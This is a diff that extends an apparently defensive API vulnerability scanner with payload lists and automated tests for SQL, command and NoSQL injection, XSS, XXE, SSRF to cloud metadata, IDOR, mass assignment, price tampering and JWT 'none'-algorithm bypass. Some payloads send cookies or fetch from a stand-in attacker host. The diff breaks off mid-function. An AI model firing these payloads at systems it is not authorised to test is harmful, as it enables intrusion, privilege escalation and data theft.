@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-API Vulnerability Scanner - Ghost Ops Security
-Comprehensive API security testing tool for attack surface mapping and OWASP Top 10 testing
+API Vulnerability Scanner v2.0 - Ghost Ops Security
+Advanced API security testing with JSON pattern analysis and data manipulation
 """
 
 import requests
@@ -10,7 +10,8 @@ import time
 import re
 import argparse
 import urllib.parse
-from typing import Dict, List, Any, Tuple
+import copy
+from typing import Dict, List, Any, Tuple, Optional
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from dataclasses import dataclass, asdict
 from datetime import datetime
@@ -33,6 +34,7 @@ class Finding:
     evidence: str
     remediation: str
     timestamp: str
+    manipulation_details: str = ""
 
 class Colors:
     """ANSI color codes for terminal output"""
@@ -47,21 +49,26 @@ class Colors:
     END = '\033[0m'
 
 class APIVulnScanner:
-    def __init__(self, base_url: str, headers: Dict = None, proxy: Dict = None, threads: int = 10):
+    def __init__(self, base_url: str, headers: Dict = None, proxy: Dict = None, threads: int = 10, cookies: Dict = None):
         self.base_url = base_url.rstrip('/')
         self.headers = headers or {}
         self.proxy = proxy
         self.threads = threads
+        self.cookies = cookies or {}
         self.findings: List[Finding] = []
         self.endpoints: List[Dict] = []
+        self.api_schemas: Dict = {}  # Store discovered API schemas
+        self.json_patterns: List[Dict] = []  # Store JSON response patterns
         self.session = requests.Session()
         self.session.headers.update(self.headers)
+        if self.cookies:
+            self.session.cookies.update(self.cookies)
         
-        # OWASP Top 10 payloads
+        # Load comprehensive payloads
         self.payloads = self._load_payloads()
         
     def _load_payloads(self) -> Dict:
-        """Load OWASP API Security Top 10 2023 attack payloads"""
+        """Load comprehensive attack payloads"""
         return {
             'sqli': [
                 "' OR '1'='1",
@@ -76,7 +83,10 @@ class APIVulnScanner:
                 "' OR 'x'='x",
                 "1; DROP TABLE users--",
                 "' OR 1=1#",
-                "' WAITFOR DELAY '0:0:5'--"
+                "' WAITFOR DELAY '0:0:5'--",
+                "1' AND SLEEP(5)--",
+                "' AND '1'='1",
+                "' AND extractvalue(1,concat(0x7e,version()))--"
             ],
             'xss': [
                 "<script>alert('XSS')</script>",
@@ -87,7 +97,10 @@ class APIVulnScanner:
                 "<iframe src=javascript:alert('XSS')>",
                 "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
                 "<IMG SRC=\"javascript:alert('XSS');\">",
-                "<script>fetch('http://attacker.com?c='+document.cookie)</script>"
+                "<script>fetch('http://attacker.com?c='+document.cookie)</script>",
+                "'-alert(1)-'",
+                "\"><img src=x onerror=alert(1)>",
+                "<svg/onload=alert(1)>"
             ],
             'command_injection': [
                 "; ls -la",
@@ -101,22 +114,28 @@ class APIVulnScanner:
                 "`whoami`",
                 "$(whoami)",
                 "; sleep 5",
-                "| sleep 5 #"
+                "| sleep 5 #",
+                "&& timeout 5",
+                "; curl http://attacker.com",
+                "| wget http://attacker.com"
             ],
             'path_traversal': [
                 "../../../etc/passwd",
-                "..\\..\\..\\windows\\win.ini",
+                r"..\..\..\windows\win.ini",
                 "....//....//....//etc/passwd",
                 "..%2F..%2F..%2Fetc%2Fpasswd",
                 "..%252F..%252F..%252Fetc%252Fpasswd",
                 "/etc/passwd",
                 "../../../../../../etc/passwd%00",
-                "....\/....\/....\/etc/passwd"
+                r"....\/....\/....\/etc/passwd",
+                "....//....//....//windows/win.ini",
+                "/var/www/../../etc/passwd"
             ],
             'xxe': [
                 '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                 '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com">]><foo>&xxe;</foo>',
-                '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>'
+                '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
+                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><foo></foo>'
             ],
             'ssrf': [
                 "http://127.0.0.1",
@@ -125,10 +144,14 @@ class APIVulnScanner:
                 "http://[::1]",
                 "http://127.1",
                 "http://0.0.0.0",
-                "http://metadata.google.internal/computeMetadata/v1/"
+                "http://metadata.google.internal/computeMetadata/v1/",
+                "http://instance-data/latest/meta-data/",
+                "http://127.0.0.1:22",
+                "http://localhost:3306",
+                "http://169.254.169.254/latest/user-data/"
             ],
             'idor': [
-                "1", "2", "100", "999", "0", "-1", "admin", "test"
+                "1", "2", "100", "999", "0", "-1", "admin", "test", "9999", "00001"
             ],
             'nosqli': [
                 '{"$gt":""}',
@@ -136,17 +159,55 @@ class APIVulnScanner:
                 '{"$regex":".*"}',
                 '{"username":{"$ne":null},"password":{"$ne":null}}',
                 '{"$where":"sleep(5000)"}',
-                '{"$or":[{},{"a":"a"}]}'
+                '{"$or":[{},{"a":"a"}]}',
+                '{"$gt": ""}',
+                '{"$nin":[]}',
+                '{"username":{"$regex":".*"}}'
             ],
             'jwt_attacks': [
-                'none',  # Algorithm confusion
-                'HS256'  # Algorithm downgrade
+                'none',
+                'HS256',
+                'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.',  # None algorithm
+                'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.test'  # Modified claims
             ],
             'mass_assignment': [
                 '{"isAdmin":true}',
                 '{"role":"admin"}',
                 '{"permission":"admin"}',
-                '{"admin":1}'
+                '{"admin":1}',
+                '{"is_admin":true}',
+                '{"user_role":"administrator"}',
+                '{"privileges":["admin","superuser"]}',
+                '{"account_type":"premium"}',
+                '{"verified":true}',
+                '{"active":true}',
+                '{"approved":true}',
+                '{"status":"active"}',
+                '{"membership":"premium"}'
+            ],
+            'graphql_attacks': [
+                '{ __schema { types { name } } }',
+                '{ __type(name: "Query") { fields { name } } }',
+                'query { user(id: "1") { password email ssn } }',
+                'mutation { deleteUser(id: "1") { id } }',
+                'query { users { password } }',
+                '{ __schema { queryType { fields { name } } } }'
+            ],
+            'api_abuse': [
+                '999999',
+                '-1',
+                '0',
+                '{"price":0.01}',
+                '{"discount":100}',
+                '{"quantity":999999}',
+                '{"amount":-100}',
+                '{"balance":999999999}'
+            ],
+            'rate_limit_bypass': [
+                '127.0.0.1',
+                '0.0.0.0',
+                '10.0.0.1',
+                'localhost'
             ]
         }
 
@@ -155,17 +216,280 @@ class APIVulnScanner:
         banner = f"""
 {Colors.CYAN}{Colors.BOLD}
 ╔═══════════════════════════════════════════════════════════╗
-║       API Vulnerability Scanner - Ghost Ops Security      ║
-║          OWASP API Security Top 10 2023 Testing           ║
+║       API Vulnerability Scanner v2.0                      ║
+║            Ghost Ops Security                              ║
+║     Advanced API Testing with Pattern Analysis            ║
 ╚═══════════════════════════════════════════════════════════╝
 {Colors.END}
 {Colors.YELLOW}[*] Target: {self.base_url}
 [*] Threads: {self.threads}
-[*] Framework: OWASP API Security Top 10 2023
+[*] Cookies: {'Enabled' if self.cookies else 'None'}
+[*] JSON Pattern Analysis: Enabled
+[*] API Data Manipulation: Enabled
 [*] Starting scan at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 {Colors.END}
 """
         print(banner)
+
+    def analyze_json_response(self, response: requests.Response, endpoint: str) -> Dict:
+        """Analyze JSON response for patterns and structure"""
+        try:
+            json_data = response.json()
+            analysis = {
+                'endpoint': endpoint,
+                'structure': self._get_json_structure(json_data),
+                'sensitive_keys': self._find_sensitive_keys(json_data),
+                'numeric_fields': self._find_numeric_fields(json_data),
+                'boolean_fields': self._find_boolean_fields(json_data),
+                'id_fields': self._find_id_fields(json_data),
+                'url_fields': self._find_url_fields(json_data),
+                'nested_objects': self._find_nested_objects(json_data),
+                'array_fields': self._find_array_fields(json_data)
+            }
+            self.json_patterns.append(analysis)
+            return analysis
+        except:
+            return {}
+
+    def _get_json_structure(self, data, prefix='') -> Dict:
+        """Recursively analyze JSON structure"""
+        structure = {}
+        if isinstance(data, dict):
+            for key, value in data.items():
+                full_key = f"{prefix}.{key}" if prefix else key
+                structure[full_key] = type(value).__name__
+                if isinstance(value, (dict, list)):
+                    structure.update(self._get_json_structure(value, full_key))
+        elif isinstance(data, list) and data:
+            structure[f"{prefix}[0]"] = type(data[0]).__name__
+            if isinstance(data[0], (dict, list)):
+                structure.update(self._get_json_structure(data[0], f"{prefix}[0]"))
+        return structure
+
+    def _find_sensitive_keys(self, data, path='') -> List[str]:
+        """Find potentially sensitive keys in JSON"""
+        sensitive = []
+        sensitive_patterns = [
+            'password', 'passwd', 'pwd', 'secret', 'token', 'api_key', 'apikey',
+            'private', 'ssn', 'social', 'credit', 'card', 'cvv', 'pin',
+            'auth', 'session', 'jwt', 'bearer', 'key', 'salt', 'hash',
+            'email', 'phone', 'address', 'dob', 'birth'
+        ]
+        
+        if isinstance(data, dict):
+            for key, value in data.items():
+                current_path = f"{path}.{key}" if path else key
+                if any(pattern in key.lower() for pattern in sensitive_patterns):
+                    sensitive.append(current_path)
+                if isinstance(value, (dict, list)):
+                    sensitive.extend(self._find_sensitive_keys(value, current_path))
+        elif isinstance(data, list):
+            for i, item in enumerate(data[:5]):  # Check first 5 items
+                if isinstance(item, (dict, list)):
+                    sensitive.extend(self._find_sensitive_keys(item, f"{path}[{i}]"))
+        return sensitive
+
+    def _find_numeric_fields(self, data, path='') -> List[Tuple[str, Any]]:
+        """Find numeric fields for price manipulation testing"""
+        numeric = []
+        if isinstance(data, dict):
+            for key, value in data.items():
+                current_path = f"{path}.{key}" if path else key
+                if isinstance(value, (int, float)):
+                    numeric.append((current_path, value))
+                elif isinstance(value, (dict, list)):
+                    numeric.extend(self._find_numeric_fields(value, current_path))
+        elif isinstance(data, list):
+            for i, item in enumerate(data[:5]):
+                if isinstance(item, (dict, list)):
+                    numeric.extend(self._find_numeric_fields(item, f"{path}[{i}]"))
+        return numeric
+
+    def _find_boolean_fields(self, data, path='') -> List[Tuple[str, bool]]:
+        """Find boolean fields for privilege escalation testing"""
+        boolean = []
+        if isinstance(data, dict):
+            for key, value in data.items():
+                current_path = f"{path}.{key}" if path else key
+                if isinstance(value, bool):
+                    boolean.append((current_path, value))
+                elif isinstance(value, (dict, list)):
+                    boolean.extend(self._find_boolean_fields(value, current_path))
+        elif isinstance(data, list):
+            for i, item in enumerate(data[:5]):
+                if isinstance(item, (dict, list)):
+                    boolean.extend(self._find_boolean_fields(item, f"{path}[{i}]"))
+        return boolean
+
+    def _find_id_fields(self, data, path='') -> List[Tuple[str, Any]]:
+        """Find ID fields for IDOR testing"""
+        ids = []
+        id_patterns = ['id', 'user_id', 'account_id', 'order_id', 'product_id', 'uuid', 'guid', 'ref']
+        
+        if isinstance(data, dict):
+            for key, value in data.items():
+                current_path = f"{path}.{key}" if path else key
+                if any(pattern in key.lower() for pattern in id_patterns):
+                    ids.append((current_path, value))
+                if isinstance(value, (dict, list)):
+                    ids.extend(self._find_id_fields(value, current_path))
+        elif isinstance(data, list):
+            for i, item in enumerate(data[:5]):
+                if isinstance(item, (dict, list)):
+                    ids.extend(self._find_id_fields(item, f"{path}[{i}]"))
+        return ids
+
+    def _find_url_fields(self, data, path='') -> List[Tuple[str, str]]:
+        """Find URL fields for SSRF testing"""
+        urls = []
+        if isinstance(data, dict):
+            for key, value in data.items():
+                current_path = f"{path}.{key}" if path else key
+                if isinstance(value, str) and ('url' in key.lower() or 'link' in key.lower() or value.startswith(('http://', 'https://'))):
+                    urls.append((current_path, value))
+                if isinstance(value, (dict, list)):
+                    urls.extend(self._find_url_fields(value, current_path))
+        elif isinstance(data, list):
+            for i, item in enumerate(data[:5]):
+                if isinstance(item, (dict, list)):
+                    urls.extend(self._find_url_fields(item, f"{path}[{i}]"))
+        return urls
+
+    def _find_array_fields(self, data, path='') -> List[str]:
+        """Find array fields for injection testing"""
+        arrays = []
+        if isinstance(data, dict):
+            for key, value in data.items():
+                current_path = f"{path}.{key}" if path else key
+                if isinstance(value, list):
+                    arrays.append(current_path)
+                elif isinstance(value, dict):
+                    arrays.extend(self._find_array_fields(value, current_path))
+        return arrays
+
+    def _find_nested_objects(self, data, path='', depth=0) -> List[Dict]:
+        """Find nested objects for deep testing"""
+        nested = []
+        if depth > 5:
+            return nested
+            
+        if isinstance(data, dict):
+            for key, value in data.items():
+                current_path = f"{path}.{key}" if path else key
+                if isinstance(value, dict):
+                    nested.append({'path': current_path, 'keys': list(value.keys()), 'depth': depth})
+                    nested.extend(self._find_nested_objects(value, current_path, depth + 1))
+                elif isinstance(value, list):
+                    nested.extend(self._find_nested_objects(value, current_path, depth + 1))
+        elif isinstance(data, list) and data:
+            for i, item in enumerate(data[:3]):
+                if isinstance(item, (dict, list)):
+                    nested.extend(self._find_nested_objects(item, f"{path}[{i}]", depth + 1))
+        return nested
+
+    def manipulate_json_data(self, original_data: Dict, analysis: Dict) -> List[Dict]:
+        """Generate manipulated versions of JSON data for testing"""
+        manipulated_versions = []
+        
+        # Test 1: Flip all boolean fields
+        if analysis.get('boolean_fields'):
+            for field_path, original_value in analysis['boolean_fields']:
+                test_data = copy.deepcopy(original_data)
+                self._set_nested_value(test_data, field_path, not original_value)
+                manipulated_versions.append({
+                    'type': 'boolean_flip',
+                    'field': field_path,
+                    'original': original_value,
+                    'modified': not original_value,
+                    'data': test_data
+                })
+        
+        # Test 2: Manipulate numeric fields (price, quantity, etc.)
+        if analysis.get('numeric_fields'):
+            for field_path, original_value in analysis['numeric_fields'][:10]:  # Limit to prevent too many tests
+                for test_value in [0, -1, 0.01, 999999, -999999]:
+                    test_data = copy.deepcopy(original_data)
+                    self._set_nested_value(test_data, field_path, test_value)
+                    manipulated_versions.append({
+                        'type': 'numeric_manipulation',
+                        'field': field_path,
+                        'original': original_value,
+                        'modified': test_value,
+                        'data': test_data
+                    })
+        
+        # Test 3: IDOR testing - modify ID fields
+        if analysis.get('id_fields'):
+            for field_path, original_value in analysis['id_fields'][:5]:
+                for test_id in ['1', '2', '999', '0', 'admin', 'test']:
+                    test_data = copy.deepcopy(original_data)
+                    self._set_nested_value(test_data, field_path, test_id)
+                    manipulated_versions.append({
+                        'type': 'idor_test',
+                        'field': field_path,
+                        'original': original_value,
+                        'modified': test_id,
+                        'data': test_data
+                    })
+        
+        # Test 4: SSRF via URL fields
+        if analysis.get('url_fields'):
+            for field_path, original_url in analysis['url_fields']:
+                for ssrf_payload in self.payloads['ssrf'][:5]:
+                    test_data = copy.deepcopy(original_data)
+                    self._set_nested_value(test_data, field_path, ssrf_payload)
+                    manipulated_versions.append({
+                        'type': 'ssrf_test',
+                        'field': field_path,
+                        'original': original_url,
+                        'modified': ssrf_payload,
+                        'data': test_data
+                    })
+        
+        # Test 5: Mass assignment - add privilege fields
+        for payload in self.payloads['mass_assignment'][:5]:
+            test_data = copy.deepcopy(original_data)
+            try:
+                additional_fields = json.loads(payload)
+                test_data.update(additional_fields)
+                manipulated_versions.append({
+                    'type': 'mass_assignment',
+                    'field': 'root',
+                    'original': 'N/A',
+                    'modified': payload,
+                    'data': test_data
+                })
+            except:
+                pass
+        
+        return manipulated_versions
+
+    def _set_nested_value(self, data: Dict, path: str, value: Any):
+        """Set value in nested dictionary using dot notation path"""
+        keys = path.split('.')
+        current = data
+        
+        for key in keys[:-1]:
+            # Handle array notation
+            if '[' in key:
+                key_name = key.split('[')[0]
+                index = int(key.split('[')[1].split(']')[0])
+                if key_name not in current:
+                    current[key_name] = []
+                current = current[key_name][index]
+            else:
+                if key not in current:
+                    current[key] = {}
+                current = current[key]
+        
+        # Set the final value
+        final_key = keys[-1]
+        if '[' in final_key:
+            key_name = final_key.split('[')[0]
+            index = int(final_key.split('[')[1].split(']')[0])
+            current[key_name][index] = value
+        else:
+            current[final_key] = value
 
     def discover_endpoints(self, wordlist: List[str] = None) -> List[Dict]:
         """Discover API endpoints through fuzzing"""
@@ -176,7 +500,7 @@ class APIVulnScanner:
             '/api/v1/admin', '/api/admin',
             '/api/v1/login', '/api/login', '/api/auth/login',
             '/api/v1/register', '/api/register',
-            '/api/v1/profile', '/api/profile',
+            '/api/v1/profile', '/api/profile', '/api/me',
             '/api/v1/upload', '/api/upload',
             '/api/v1/download', '/api/download',
             '/api/v1/search', '/api/search',
@@ -188,11 +512,14 @@ class APIVulnScanner:
             '/api/v1/backup', '/api/backup',
             '/api/v1/export', '/api/export',
             '/api/v1/import', '/api/import',
-            '/api/v1/docs', '/api/docs', '/api/swagger',
+            '/api/v1/docs', '/api/docs', '/api/swagger', '/api/swagger.json',
             '/api/v1/health', '/api/health',
             '/api/v1/status', '/api/status',
             '/graphql', '/api/graphql',
-            '/.git/config', '/.env', '/api/.env'
+            '/.git/config', '/.env', '/api/.env',
+            '/api/v1/payments', '/api/payments',
+            '/api/v1/cart', '/api/cart',
+            '/api/v1/checkout', '/api/checkout'
         ]
         
         methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD']
@@ -211,13 +538,40 @@ class APIVulnScanner:
                 if result:
                     discovered.append(result)
                     print(f"{Colors.GREEN}[✓] Found: {result['method']} {result['endpoint']} (HTTP {result['status']}){Colors.END}")
+                    
+                    # Analyze JSON responses immediately
+                    if 'json_data' in result:
+                        analysis = self.analyze_json_response_data(result['json_data'], result['endpoint'])
+                        if analysis:
+                            print(f"{Colors.CYAN}    → JSON Analysis: {len(analysis.get('sensitive_keys', []))} sensitive keys, "
+                                  f"{len(analysis.get('numeric_fields', []))} numeric fields, "
+                                  f"{len(analysis.get('boolean_fields', []))} boolean fields{Colors.END}")
         
         self.endpoints = discovered
         print(f"\n{Colors.BOLD}{Colors.GREEN}[+] Discovered {len(discovered)} active endpoints{Colors.END}\n")
         return discovered
 
+    def analyze_json_response_data(self, json_data: Any, endpoint: str) -> Dict:
+        """Analyze JSON data without needing response object"""
+        try:
+            analysis = {
+                'endpoint': endpoint,
+                'structure': self._get_json_structure(json_data),
+                'sensitive_keys': self._find_sensitive_keys(json_data),
+                'numeric_fields': self._find_numeric_fields(json_data),
+                'boolean_fields': self._find_boolean_fields(json_data),
+                'id_fields': self._find_id_fields(json_data),
+                'url_fields': self._find_url_fields(json_data),
+                'nested_objects': self._find_nested_objects(json_data),
+                'array_fields': self._find_array_fields(json_data)
+            }
+            self.json_patterns.append(analysis)
+            return analysis
+        except:
+            return {}
+
     def _test_endpoint(self, endpoint: str, method: str) -> Dict:
-        """Test if an endpoint exists"""
+        """Test if an endpoint exists and analyze response"""
         url = f"{self.base_url}{endpoint}"
         try:
             response = self.session.request(
@@ -229,18 +583,357 @@ class APIVulnScanner:
                 proxies=self.proxy
             )
             
-            # Consider endpoint as found if not 404
             if response.status_code != 404:
-                return {
+                result = {
                     'endpoint': endpoint,
                     'method': method,
                     'status': response.status_code,
                     'content_type': response.headers.get('Content-Type', ''),
                     'length': len(response.content)
                 }
+                
+                # Try to parse JSON response
+                try:
+                    json_data = response.json()
+                    result['json_data'] = json_data
+                    result['has_json'] = True
+                except:
+                    result['has_json'] = False
+                
+                return result
         except Exception as e:
             pass
         return None
+
+    def test_api_data_manipulation(self, endpoint_data: Dict):
+        """Test API data manipulation vulnerabilities"""
+        if not endpoint_data.get('has_json') or endpoint_data.get('method') not in ['POST', 'PUT', 'PATCH']:
+            return
+        
+        print(f"\n{Colors.BOLD}[+] Phase: API Data Manipulation Testing - {endpoint_data['method']} {endpoint_data['endpoint']}{Colors.END}")
+        
+        url = f"{self.base_url}{endpoint_data['endpoint']}"
+        original_data = endpoint_data.get('json_data', {})
+        
+        # Analyze the JSON structure
+        analysis = self.analyze_json_response_data(original_data, endpoint_data['endpoint'])
+        
+        # Generate manipulated versions
+        manipulated_versions = self.manipulate_json_data(original_data, analysis)
+        
+        print(f"{Colors.YELLOW}[*] Testing {len(manipulated_versions)} data manipulation scenarios...{Colors.END}")
+        
+        # Get baseline response
+        try:
+            baseline_response = self.session.request(
+                endpoint_data['method'],
+                url,
+                json=original_data,
+                timeout=10,
+                verify=False,
+                proxies=self.proxy
+            )
+            baseline_length = len(baseline_response.content)
+            baseline_status = baseline_response.status_code
+        except:
+            return
+        
+        # Test each manipulation
+        for manipulation in manipulated_versions[:50]:  # Limit tests
+            try:
+                response = self.session.request(
+                    endpoint_data['method'],
+                    url,
+                    json=manipulation['data'],
+                    timeout=10,
+                    verify=False,
+                    proxies=self.proxy
+                )
+                
+                # Check for successful manipulation
+                if response.status_code == 200 and abs(len(response.content) - baseline_length) > 10:
+                    # Verify the manipulation was accepted
+                    if manipulation['type'] == 'boolean_flip':
+                        self._check_boolean_flip_success(endpoint_data, manipulation, response)
+                    elif manipulation['type'] == 'numeric_manipulation':
+                        self._check_numeric_manipulation_success(endpoint_data, manipulation, response)
+                    elif manipulation['type'] == 'mass_assignment':
+                        self._check_mass_assignment_success(endpoint_data, manipulation, response)
+                    elif manipulation['type'] == 'idor_test':
+                        self._check_idor_success(endpoint_data, manipulation, response)
+                    elif manipulation['type'] == 'ssrf_test':
+                        self._check_ssrf_success(endpoint_data, manipulation, response)
+                        
+            except Exception as e:
+                pass
+
+    def _check_boolean_flip_success(self, endpoint_data: Dict, manipulation: Dict, response: requests.Response):
+        """Check if boolean flip was successful"""
+        try:
+            response_data = response.json()
+            # Check if the flipped value is reflected
+            if str(manipulation['modified']).lower() in str(response_data).lower():
+                self._add_finding(
+                    endpoint=endpoint_data['endpoint'],
+                    method=endpoint_data['method'],
+                    vuln_type='Privilege Escalation via Boolean Manipulation',
+                    severity='CRITICAL',
+                    description=f'Boolean field "{manipulation["field"]}" can be manipulated from {manipulation["original"]} to {manipulation["modified"]}',
+                    payload=json.dumps(manipulation['data'], indent=2)[:200],
+                    response_code=response.status_code,
+                    evidence=f'Field successfully changed: {manipulation["field"]}',
+                    remediation='Implement proper authorization checks. Validate user permissions before accepting boolean field changes.',
+                    manipulation_details=f'Field: {manipulation["field"]}, Original: {manipulation["original"]}, Modified: {manipulation["modified"]}'
+                )
+                print(f"{Colors.RED}[!] Boolean manipulation successful: {manipulation['field']}{Colors.END}")
+        except:
+            pass
+
+    def _check_numeric_manipulation_success(self, endpoint_data: Dict, manipulation: Dict, response: requests.Response):
+        """Check if numeric manipulation was successful"""
+        try:
+            response_data = response.json()
+            # Look for price/amount manipulation acceptance
+            if manipulation['modified'] in [0, 0.01, -1] and response.status_code == 200:
+                self._add_finding(
+                    endpoint=endpoint_data['endpoint'],
+                    method=endpoint_data['method'],
+                    vuln_type='Price/Quantity Manipulation',
+                    severity='CRITICAL',
+                    description=f'Numeric field "{manipulation["field"]}" can be manipulated to {manipulation["modified"]}',
+                    payload=json.dumps(manipulation['data'], indent=2)[:200],
+                    response_code=response.status_code,
+                    evidence=f'Numeric field accepted suspicious value: {manipulation["modified"]}',
+                    remediation='Implement server-side validation for all numeric fields. Validate price and quantity ranges.',
+                    manipulation_details=f'Field: {manipulation["field"]}, Original: {manipulation["original"]}, Modified: {manipulation["modified"]}'
+                )
+                print(f"{Colors.RED}[!] Numeric manipulation successful: {manipulation['field']} = {manipulation['modified']}{Colors.END}")
+        except:
+            pass
+
+    def _check_mass_assignment_success(self, endpoint_data: Dict, manipulation: Dict, response: requests.Response):
+        """Check if mass assignment was successful"""
+        try:
+            response_data = response.json()
+            # Check if privilege fields were accepted
+            privilege_indicators = ['admin', 'role', 'permission', 'privileges', 'is_admin', 'superuser']
+            response_str = str(response_data).lower()
+            
+            if any(indicator in response_str for indicator in privilege_indicators):
+                self._add_finding(
+                    endpoint=endpoint_data['endpoint'],
+                    method=endpoint_data['method'],
+                    vuln_type='Mass Assignment / Privilege Escalation',
+                    severity='CRITICAL',
+                    description=f'API accepts unauthorized privilege fields: {manipulation["modified"]}',
+                    payload=json.dumps(manipulation['data'], indent=2)[:200],
+                    response_code=response.status_code,
+                    evidence=f'Privilege fields reflected in response',
+                    remediation='Implement whitelist of allowed fields. Use separate DTOs for user input and internal models.',
+                    manipulation_details=f'Added fields: {manipulation["modified"]}'
+                )
+                print(f"{Colors.RED}[!] Mass assignment successful - privilege escalation possible{Colors.END}")
+        except:
+            pass
+
+    def _check_idor_success(self, endpoint_data: Dict, manipulation: Dict, response: requests.Response):
+        """Check if IDOR manipulation was successful"""
+        if response.status_code == 200:
+            try:
+                response_data = response.json()
+                # If we got data back with different ID, it's IDOR
+                if manipulation['modified'] != manipulation['original']:
+                    self._add_finding(
+                        endpoint=endpoint_data['endpoint'],
+                        method=endpoint_data['method'],
+                        vuln_type='Insecure Direct Object Reference (IDOR)',
+                        severity='HIGH',
+                        description=f'ID field "{manipulation["field"]}" allows unauthorized access',
+                        payload=json.dumps(manipulation['data'], indent=2)[:200],
+                        response_code=response.status_code,
+                        evidence=f'Accessed different object by changing ID from {manipulation["original"]} to {manipulation["modified"]}',
+                        remediation='Implement proper authorization checks for object access. Verify user owns the object.',
+                        manipulation_details=f'Field: {manipulation["field"]}, Original ID: {manipulation["original"]}, Accessed ID: {manipulation["modified"]}'
+                    )
+                    print(f"{Colors.RED}[!] IDOR vulnerability: {manipulation['field']}{Colors.END}")
+            except:
+                pass
+
+    def _check_ssrf_success(self, endpoint_data: Dict, manipulation: Dict, response: requests.Response):
+        """Check if SSRF was successful"""
+        # Check for indicators of internal access
+        ssrf_indicators = ['meta-data', 'ami-id', 'instance-id', 'computeMetadata', 'privateIp', 'security-credentials']
+        
+        if any(indicator in response.text for indicator in ssrf_indicators):
+            self._add_finding(
+                endpoint=endpoint_data['endpoint'],
+                method=endpoint_data['method'],
+                vuln_type='Server-Side Request Forgery (SSRF)',
+                severity='CRITICAL',
+                description=f'SSRF via URL field "{manipulation["field"]}"',
+                payload=manipulation['modified'],
+                response_code=response.status_code,
+                evidence=f'Internal/cloud metadata accessible',
+                remediation='Implement URL whitelist. Validate and sanitize all URL inputs. Use separate networks for internal services.',
+                manipulation_details=f'Field: {manipulation["field"]}, SSRF URL: {manipulation["modified"]}'
+            )
+            print(f"{Colors.RED}[!] SSRF vulnerability: {manipulation['field']}{Colors.END}")
+
+    def test_graphql_introspection(self):
+        """Test for GraphQL introspection and unauthorized queries"""
+        print(f"\n{Colors.YELLOW}[*] Testing GraphQL endpoints...{Colors.END}")
+        
+        graphql_endpoints = ['/graphql', '/api/graphql', '/v1/graphql', '/query']
+        
+        for endpoint in graphql_endpoints:
+            url = f"{self.base_url}{endpoint}"
+            
+            for payload in self.payloads['graphql_attacks']:
+                try:
+                    # Try as GET query
+                    response_get = self.session.get(
+                        url,
+                        params={'query': payload},
+                        timeout=10,
+                        verify=False,
+                        proxies=self.proxy
+                    )
+                    
+                    # Try as POST
+                    response_post = self.session.post(
+                        url,
+                        json={'query': payload},
+                        timeout=10,
+                        verify=False,
+                        proxies=self.proxy
+                    )
+                    
+                    for response in [response_get, response_post]:
+                        if response.status_code == 200:
+                            response_text = response.text.lower()
+                            
+                            # Check for successful introspection
+                            if '__schema' in payload and ('types' in response_text or 'fields' in response_text):
+                                self._add_finding(
+                                    endpoint=endpoint,
+                                    method='POST',
+                                    vuln_type='GraphQL Introspection Enabled',
+                                    severity='MEDIUM',
+                                    description='GraphQL introspection is enabled, revealing API schema',
+                                    payload=payload,
+                                    response_code=response.status_code,
+                                    evidence='Schema information disclosed',
+                                    remediation='Disable introspection in production environments.',
+                                    manipulation_details='GraphQL schema exposed'
+                                )
+                                print(f"{Colors.YELLOW}[!] GraphQL introspection enabled{Colors.END}")
+                            
+                            # Check for sensitive data exposure
+                            elif any(field in response_text for field in ['password', 'ssn', 'secret', 'token']):
+                                self._add_finding(
+                                    endpoint=endpoint,
+                                    method='POST',
+                                    vuln_type='GraphQL Sensitive Data Exposure',
+                                    severity='HIGH',
+                                    description='GraphQL query returns sensitive fields',
+                                    payload=payload,
+                                    response_code=response.status_code,
+                                    evidence='Sensitive data fields accessible',
+                                    remediation='Implement field-level authorization. Restrict sensitive field access.',
+                                    manipulation_details='Sensitive fields exposed via GraphQL'
+                                )
+                                print(f"{Colors.RED}[!] GraphQL sensitive data exposure{Colors.END}")
+                
+                except Exception:
+                    pass
+
+    def test_authentication_bypass(self):
+        """Test for authentication bypass techniques"""
+        print(f"\n{Colors.YELLOW}[*] Testing authentication bypass techniques...{Colors.END}")
+        
+        # Test JWT manipulation
+        if 'Authorization' in self.headers or 'authorization' in self.headers:
+            auth_header = self.headers.get('Authorization') or self.headers.get('authorization', '')
+            
+            if 'Bearer' in auth_header:
+                print(f"{Colors.CYAN}[*] Testing JWT token manipulation...{Colors.END}")
+                
+                # Test with 'none' algorithm
+                none_token = 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.'
+                
+                test_headers = self.headers.copy()
+                test_headers['Authorization'] = f'Bearer {none_token}'
+                
+                for endpoint_data in self.endpoints[:5]:
+                    try:
+                        url = f"{self.base_url}{endpoint_data['endpoint']}"
+                        response = self.session.request(
+                            endpoint_data['method'],
+                            url,
+                            headers=test_headers,
+                            timeout=10,
+                            verify=False,
+                            proxies=self.proxy
+                        )
+                        
+                        if response.status_code in [200, 201, 204]:
+                            self._add_finding(
+                                endpoint=endpoint_data['endpoint'],
+                                method=endpoint_data['method'],
+                                vuln_type='JWT Algorithm Confusion',
+                                severity='CRITICAL',
+                                description='API accepts JWT with "none" algorithm, allowing authentication bypass',
+                                payload=none_token,
+                                response_code=response.status_code,
+                                evidence='Token with "none" algorithm accepted',
+                                remediation='Enforce specific JWT algorithms. Reject "none" algorithm tokens.',
+                                manipulation_details='JWT algorithm set to "none"'
+                            )
